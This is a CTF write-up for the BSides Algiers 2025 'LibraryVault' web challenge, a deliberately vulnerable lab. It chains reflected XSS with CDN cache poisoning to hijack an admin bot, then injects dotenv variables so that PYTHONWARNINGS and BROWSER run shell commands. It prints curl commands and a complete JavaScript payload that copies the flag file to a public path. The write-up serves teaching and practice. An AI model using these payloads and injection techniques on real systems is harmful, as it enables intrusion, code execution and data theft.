---
title: "LibraryVault (web) - BSides Algiers 2025"
category: "web"
subcategory: "golang"
type: "writeup"
tags: ["web", "2025", "redis", "sqlite", "python", "tornado", "dotenv", "reflected-xss", "algiers", "bsides", "golang", "cache-poisning", "rce", "xss", "command-injection", "subprocess", "bsides-algiers", "bsides-algiers-2025", "ctf-writeup"]
summary: "Event: BSides Algiers 2025 (7th Edition)"
source:
  name: "CTFtime writeup #40527"
  url: "https://ctftime.org/writeup/40527"
original_source: "https://github.com/S450R1/library-vault-writeup"
ctf:
  name: "BSides Algiers 2025"
  year: 2025
  challenge: "LibraryVault (web)"
---

## Metadata

- **CTF:** BSides Algiers 2025
- **Task:** LibraryVault (web)
- **Author team:** WhiteDukesDZ
- **CTFtime tags:** web, 2025, redis, sqlite, python, tornado, dotenv, reflected-xss, algiers, bsides, golang, cache-poisning, rce
- **CTFtime:** <https://ctftime.org/writeup/40527>
- **Original writeup:** <https://github.com/S450R1/library-vault-writeup>

---
# ? 1. Introduction:

![7th edition of Bsides Algiers 2025](<https://raw.githubusercontent.com/S450R1/library-vault-writeup/main/static/bsides.svg>)

**Challenge**: LibraryVault   
**Event**: BSides Algiers 2025 (7th Edition)   
**Organized by**: Shellmates   
**Category**: Web Exploitation   
**Difficulty**: Hard

At first glance, LibraryVault looked like a simple book library. But behind the login lurked an admin panel and a caching service that turned this "read-only" library into a vault worth cracking.

\---

# ? 2. Reconnaissance: Listening Before Hacking

## Application Overview

The application presents itself as a simple online library. Users can browse book overviews, search the catalog, and report issues with results.

![GUI Demo 01](<https://github.com/S450R1/library-vault-writeup/raw/main/static/gui_demo1.gif>)

A login page and a registration form complete the picture of a standard web app. clean, functional, and unremarkable.

![GUI Demo 02](<https://github.com/S450R1/library-vault-writeup/raw/main/static/gui_demo2.gif>)

Things get interesting after authentication. While exploring the app, it becomes clear that an admin panel exists. but direct access is denied.

![GUI Demo 03](<https://github.com/S450R1/library-vault-writeup/raw/main/static/gui_demo3.gif>)

That's enough to confirm one thing: there's more hiding behind the shelves.

## Application Architecture

After a quick inspection of the challenge's files (see `challenge/LibraryVault`):

![Quick inspection of challenge files](<https://github.com/S450R1/library-vault-writeup/raw/main/static/quick_inspectation.gif>)

We can deduce the following architecture:

![Global architecture](<https://github.com/S450R1/library-vault-writeup/raw/main/static/global_architecture.png>)

## Interesting Discoveries

### Report API Endpoint

Looking at `challenge/LibraryVault/web-app/[app.py](http://app.py)`, we notice the `/api/report` endpoint. When called (see `challenge/LibraryVault/web-app/handlers/api/[report.py](http://report.py)`), it executes `challenge/LibraryVault/web-app/utils/[bot.py](http://bot.py)` with `http://127.0.0.1:1337/search?query=I%20BELEIVE%20IT%20DOESNT%20WORK` as an argument.

![Report Behaviour](<https://github.com/S450R1/library-vault-writeup/raw/main/static/bot_recon.gif>)

This causes the bot to log in with admin credentials, then navigate to the provided URL.

### Books API Endpoint

Looking at `challenge/LibraryVault/web-app/handlers/api/[books.py](http://books.py)` for `/api/books`: even unauthenticated users can add new books (with unverified status) by providing `title`, `author`, and `year` in a POST request.

![Add Book](<https://github.com/S450R1/library-vault-writeup/raw/main/static/add_book.gif>)

### Searching Books

Looking at `challenge/LibraryVault/web-app/handlers/routes/[search.py](http://search.py)` for `/search`: by default, it splits the `query` into words and searches for those words in the `title` or `author` of both verified and unverified books from the database. It then renders the results in `challenge/LibraryVault/web-app/templates/search.html`. 

Notably, `query` and `year` are passed directly to `search.html` without any escaping.

![Search Books](<https://github.com/S450R1/library-vault-writeup/raw/main/static/search_endpoint.gif>)

### Caching Service

The caching service (`challenge/LibraryVault/cdn-service/main.go`) caches responses for all **GET** requests except `/panel`. Caching is based solely on the requested URL string (endpoint + query parameters).

**Logic:**

\- If the request is **not cacheable** (non-GET or `/panel`):  
\- Set `X-Cache: dynamic`  
\- Forward the request to the Python web app  
  
![Dynamic Cache](<https://github.com/S450R1/library-vault-writeup/raw/main/static/dynamic_cache.gif>)

\- If the request **is cacheable**:  
\- Check Redis cache:  
\- **Miss** → `X-Cache: miss`, forward to the Python web app  
  
![Cache Miss](<https://github.com/S450R1/library-vault-writeup/raw/main/static/cache_miss.gif>)  
  
\- **Hit** → `X-Cache: hit`, serve from Redis  
  
![Cache Hit](<https://github.com/S450R1/library-vault-writeup/raw/main/static/cache_hit.gif>)

\- Responses are stored in Redis with a **60-second TTL**.

**Unusual Finding**: A closer examination of the code reveals an unusual behavior: the request body gets forwarded from the CDN service to the web app, even though it's a `GET` request.

```go  
// Create the new request with the same method, body, and headers  
req, err := http.NewRequest(origReq.Method, originURL.String(), origReq.Body)  
```

### Admin Panel

The admin panel (`challenge/LibraryVault/web-app/handlers/routes/[panel.py](http://panel.py)`) at `/panel` provides three key functions:

1\. **Update Config**: Allows admins to set `BACKUP_SERVER` and `ARCHIVE_PATH` environment variables.  
2\. **Reset Config**: Resets configuration to default values (`backup.libraryvault.local` and `/tmp/archives`).  
3\. **Run Backup**: Executes `/app/utils/[backup_catalog.py](http://backup_catalog.py)` (It just prints, no real backup process) using subprocess with the configured environment variables.

# ? 3. Vulnerability Discovery: Finding Cracks

### Evaluating XSS:

As discovered in the reconnaissance phase. `/search` endpoint use both `year` and `query` unescaped.

**Testing Stored XSS for `year` attribute** Since we have the ability to create unverified books, we tried creating a book with this informations.

```data  
title=MANINI  
author=S450R1  
year=<script>alert('WhiteDukesDZ')</script>  
```

Then we searched for this book but ..

![Testing Stored XSS](<https://github.com/S450R1/library-vault-writeup/raw/main/static/stored_xss.gif>)

a 500 status Error! This is very normal since if we take a look into `challenge/LibraryVault/web-app/db/[connection.py](http://connection.py)`. We see that `year` in books table is stored as an integer in database, so setting it as a string will definetly cause an error.

```python  
await conn.execute("""  
CREATE TABLE IF NOT EXISTS books (  
id INTEGER PRIMARY KEY AUTOINCREMENT,  
title TEXT NOT NULL,  
author TEXT NOT NULL,  
year INTEGER,  
verified INTEGER DEFAULT 0  
)  
""")  
```

So no stored XSS for the `year` attribute :/ ❌.

**Testing Reflected XSS for `query` query** Let's try searching a book using `query=<script>alert('WhiteDukesDZ')</script>`:

![Testing Reflected XSS](<https://github.com/S450R1/library-vault-writeup/raw/main/static/reflected_xss.gif>)

And boom! Reflected XSS on `query` is confirmed ✅. But how could this be benefical ? ?

As discovered before, when **POST** on `/api/report`, the admin bot visits a fixed URL (`http://127.0.0.1:1337/search?query=I%20BELEIVE%20IT%20DOESNT%20WORK`). So we can't send him a malicious URL with our discovered reflected XSS. We should dig deeper ..

**Quick Test** As discovered earlier, the cdn-service forwards request body even in GET requests. What will happen if we send a `GET` request to `/search` with `query` set on both request query (`?query=WhiteDukesDZ01`) and request body (`query=WhiteDukesDZ02`). Which one will be rendered ?

![Priority Test](<https://github.com/S450R1/library-vault-writeup/raw/main/static/priority_test.gif>)

NICE! the value from request gets displayed `WhiteDukesDZ02` from request body.

**Exploring Cache Poisning** The cdn-service is caching all GET requests (just not `/panel`). What if we can poison cache for the `/search` endpoint ? Let's test that by requesting `/search?query=WhiteDukesDZ` with request body `query=Cache Poisning`. And then trying to access `/search?query=WhiteDukesDZ` but this time without a request body.

![Cache Poisning Test](<https://github.com/S450R1/library-vault-writeup/raw/main/static/cache_poisning.gif>)

IT WORKED! Cache Poisning confirmed ✅. So what actually happened can be demonstrated in this animation:

![Cache Poisning Demonstration](<https://github.com/S450R1/library-vault-writeup/raw/main/static/cache_poisning_demo.gif>)

Nice. ? i'll assume now we have enough to get the admin account. But what can we do after that ? We definetly should have a clear plan.

**Testing the Admin Panel** Time to test the admin panel, we don't already have the admin account, but we have the source code xD. Looking at `challenge/LibraryVault/web-app/db/[utils.py](http://utils.py)` the password was hashed using this function:

```python  
import hashlib

def hash_password(password):  
return hashlib.sha256(password.encode()).hexdigest()  
```

Let's make our own password:

![Generate hashed password](<https://github.com/S450R1/library-vault-writeup/raw/main/static/gen_hashed_password.gif>)

We got `b930b2a86f94a8f8ad2182cf39d4db322fb8248d311aa8c908e201279e22ec6b`, let's change the admin password from the sqlite database that can be found at `/tmp/library.db` from inside the docker container (We know that path from `challenge/LibraryVault/web-app/db/[connection.py](http://connection.py)`):

don't forget to launch the local instance.

```sh  
cd challenge/LibraryVault && ./[build-docker.sh](http://build-docker.sh)  
```

Wait for deployment then:

```sh  
docker exec -it library_vault bash  
apt install sqlite3  
cd /tmp && sqlite3 library.db  
```

Then from table `users`, update `password` for the user with `username='admin'` with the obtained hashed password `b930b2a86f94a8f8ad2182cf39d4db322fb8248d311aa8c908e201279e22ec6b` (Hashed version of `manini123`).

```sqlite3  
UPDATE users SET password='b930b2a86f94a8f8ad2182cf39d4db322fb8248d311aa8c908e201279e22ec6b' WHERE username='admin';  
```

Let's do this together:

![Update Admin Password for Debugging](<https://github.com/S450R1/library-vault-writeup/raw/main/static/debug_update_password.gif>)

We have an admin account now, we can start testing ?. Looking at `challenge/LibraryVault/web-app/handlers/routes/[panel.py](http://panel.py)` and when seeing the subprocess call with user controlled value may give you the feeling for a command injection:

```python  
result = subprocess.run(  
["/usr/local/bin/python3", "/app/utils/[backup_catalog.py](http://backup_catalog.py)"],  
env=env,  
capture_output=True,  
text=True,  
timeout=30  
)  
```

But it's definetly not the case xD, since if we look at `challenge/LibraryVault/web-app/utils/[backup_catalog.py](http://backup_catalog.py)` there's only normal python prints. So we need to think deeper.

The panel is using `dotenv` library for setting and loading the environment variable, the documentation of this library can be found here: [Python dotenv Documentation](<https://pypi.org/project/python-dotenv/>). And there is this golden part:

![dotenv Documentation](<https://github.com/S450R1/library-vault-writeup/raw/main/static/dotenv_docs.png>)

So **values can be unquoted, single or double quoted**, **we can use some escape sequences for both single and double quoted values**, **single and double quoted values can be multi-line**. Using this knowledge and since we have control over `BACKUP_SERVER` and `BACKUP_SERVER` environment variables through the admin panel, what if we try to inject a new line into our environment variables and see what happen.

```sh  
curl -vv -X POST "http://127.0.0.1:1337/login" --data-raw "username=admin&password=manini123"  
```

Grap the cookie from `Set-Cookie` header then:

```sh  
export COOKIE=<replace_cookie_here>  
curl -X POST "http://127.0.0.1:1337/panel" -H "Cookie: $COOKIE" --data-raw "action=update_config&backup_server=DUMMY1%0ADUMMY2&archive_path=DUMMY3%0ADUMMY4"  
```

Notice that we used `%0A` for the new line which is the url encoding of `\n`.

![Testing New Line in Admin Panel](<https://github.com/S450R1/library-vault-writeup/raw/main/static/newline_test.gif>)

Notice that in `.env`, the two environment variables becomes single quoted and multi-line (We didn't inject new variables). But what if we can inject new variables ? 

Let's try to use an escape sequence to escape the single quoted values: `%5c%27` (url encoding of `\'`) and since `'` become `\'` so `\'` become `\\\'` which is simply a quote xD. and then inject new `KEY=VALUE%0A%5c` (notice that we added another `%0A%5c`after `VALUE` so we can escape the closing quote):

```sh  
curl -X POST "http://127.0.0.1:1337/panel" -H "Cookie: $COOKIE" --data-raw "action=reset_config"

curl -X POST "http://127.0.0.1:1337/panel" -H "Cookie: $COOKIE" --data-raw "action=update_config&backup_server=DUMMY1%5c%27%0ANEW_VAR=DUMMY%0A%5c&archive_path=DUMMY2%5c%27%0ANEW_VAR2=DUMMY%0A%5c"  
```

Seems good. But let's see how python dotenv will read this. And in order to do this we can debug inside the container instance using the same logic used to read .env for the `action=run_backup`:

```sh  
docker exec -it library_vault bash  
cd /app  
python  
```

```python  
import os  
from dotenv import load_dotenv

ENVIRON_FILE='.env'

load_dotenv(ENVIRON_FILE)  
backup_server = os.getenv("BACKUP_SERVER", "")  
archive_path = os.getenv("ARCHIVE_PATH", "")  
new_var = os.getenv("NEW_VAR", "")  
new_var2 = os.getenv("NEW_VAR2", "")

# Prepare environment variables for the subprocess  
env = os.environ.copy()  
env["BACKUP_SERVER"] = backup_server  
env["ARCHIVE_PATH"] = archive_path  
env["NEW_VAR"] = new_var  
env["NEW_VAR2"] = new_var2

print(env)  
```

Let's try:

![Environment Variable Injection](<https://github.com/S450R1/library-vault-writeup/raw/main/static/env_injection.gif>)

AND YES! We succesfully injected our new environment variable `NEW_VAR2` ✅. Okay, but how can this lead us to the precious flag ? ?

# ? 4. Exploring Shenanigans: Hacking with Environment Variables

## Executing Code Using Environment Variables:

Making a quick research in google with "Hacking with Environment Variables" as a search query will lead you to this page [Hacking with Environment Variables](<https://www.elttam.com/blog/env/>). And you can find this interesting section about Python:

![Hacking with env Python](<https://github.com/S450R1/library-vault-writeup/raw/main/static/hacking_env_python.png>)

Currently we don't have the ability to create directories or files on the host so `PYTHONHOME` and `PYTHONPATH` are not interesting for us.

## Executing Code Using `PYTHONWARNINGS` and `BROWSER`:

`PYTHONWARNINGS` environment variable allows us to import a python module (as long as our speciefied category contains a dot). But what can we do with that ? ?

**antigravity module** `import antigravity` will immediately open a web browser. What actually happens when importing `antigravity`:

```python  
import webbrowser  
webbrowser.open("<https://xkcd.com/353/>")  
```

This will check your `PATH` for a large variety of browsers but also accepts the environment variable `BROWSER` that lets you specify which process to execute.

Okay, time to be creatif ?. Let's test something. What would happen if we set `BROWSER` to something like `ls`, and then importing `antigravity` ?

![Direct ls on BROWSER](<https://github.com/S450R1/library-vault-writeup/raw/main/static/direct_ls_browser.gif>)

Nice, what happened is the same as what would happen if we executed `ls '<https://xkcd.com/353/'>` on shell. We can eliminate that extra link using `BROWSER="/bin/sh -c 'ls' %s"`:

![ls on BROWSER](<https://github.com/S450R1/library-vault-writeup/raw/main/static/ls_browser.gif>)

AND YES :), we have executed code only by using `BROWSER` and the `antigravity` import ✅.

Let's put our knowledge about `PYTHONWARNINGS` and `BROWSER` together and execute code.

1 - We will set `BROWSER="/bin/sh -c 'ls' %s"`.

2 - We will set `PYTHONWARNINGS=ignore::antigravity.Foo::0` (Following the `action:message:category:module:line` structure, so in this case `action=ignore`, `message=<empty>`, `category=antigravity.Foo` (doted), `module=<empty>`, `line=0`).

3 - And then do the `subprocess.run` call with our environment variables. Python will evaluate warning filters before executing the script (which will import `antigravity` and execute our `BROWSER` command :D).

To test this locally, we tried to create a similar python script to what's happening in `action=run_backup` in admin panel (see `testing`, we putted the scripts there).

```python  
import os  
import subprocess  
from dotenv import load_dotenv, set_key

ENVIRON_FILE=".env"  
load_dotenv(ENVIRON_FILE)

# Prepare environment variables for the subprocess  
env = os.environ.copy()

# Execute backup script with environment variables loaded  
try:  
result = subprocess.run(  
["python3", "[dummy.py](http://dummy.py)"],  
env=env,  
capture_output=True,  
text=True,  
timeout=30  
)  
output = result.stdout if result.returncode == 0 else result.stderr  
print(output)  
except Exception as e:  
print(e)

```

Set `.env` to:

```env  
BROWSER="/bin/sh -c 'ls' %s"  
PYTHONWARNINGS=ignore::antigravity.Foo::0  
```

And `[dummy.py](http://dummy.py)`:

```python  
print("Script Executed")  
```

Let's try this out:

![Code Execution using BROWSER and PYTHONWARNINGS](<https://github.com/S450R1/library-vault-writeup/raw/main/static/chaining_ce.gif>)

CODE EXECUTED ! We now, have all what's necessary to solve this challenge ✅.

# ?? 5. Putting it all together: From Crack to Flag

**Chaining XSS with the Cache Poisning** As discovered before, by POSTing into `/api/report` will cause the admin bot to visit a fixed URL `http://127.0.0.1:1337/search?query=I%20BELEIVE%20IT%20DOESNT%20WORK`. The Reflected XSS lies in the search `query`, and by chaining this XSS with the discovered cache poisning (by setting `/search?query=I%20BELEIVE%20IT%20DOESNT%20WORK`, and setting `query` in request body to our XSS payload). We can cause the admin to perform a malicious action.

![Chaining XSS with Cache Poisning](<https://github.com/S450R1/library-vault-writeup/raw/main/static/xss_cache_poisning.gif>)

**Remote Code Execution through the XSS payload** As discovered before, using the admin account we can insert new environment variables through the admin panel. So we can set `BROWSER` to `/bin/sh -c 'cat /flag.txt > static/maninos.txt'` (Exfiltrating the flag.txt content to a publicly accessible endpoint). And `PYTHONWARNINGS` to `ignore::antigravity.Foo::0` as explained before. And then calling the `subprocess.run` with our setted env variables by performing `action=run_backup` to trigger the command execution. This can be done using this XSS payload:

```javascript  
<script>  
fetch('/panel', {  
method: 'POST',  
headers: {'Content-Type': 'application/x-www-form-urlencoded'},  
credentials: 'include',  
body: 'action=update_config&backup_server=backup.libraryvault.local%5C%27%0A%5C&archive_path=%2Ftmp%2Farchives%5C%27%0APYTHONWARNINGS%3Dignore%3A%3Aantigravity.Foo%3A%3A0%0ABROWSER%3D%2Fbin%2Fsh+-c+%22cat+%2Fflag.txt+%3E+%2Fapp%2Fstatic%2Fmaninos.txt%22+%25s%0A%5C'  
}).then(() => {  
return fetch('/panel', {  
method: 'POST',  
headers: {'Content-Type': 'application/x-www-form-urlencoded'},  
credentials: 'include',  
body: 'action=run_backup'  
});  
});  
</script>  
```

After this attack, we'll just visit `/static/maninos.txt` and get our precious flag ?.

In order to automate the process, we've written `[exploit.py](http://exploit.py)` containing the complete attack (Can you imagine that the complete exploit is just 28 lines of code xD ?).

Let's try this out:

![Final Exploit](<https://github.com/S450R1/library-vault-writeup/raw/main/static/final_exploit.gif>)

FLAG OBTAINED ✅. THANK YOU FOR READING ?

![Bye Bye](<https://github.com/S450R1/library-vault-writeup/raw/main/static/bye.gif>)
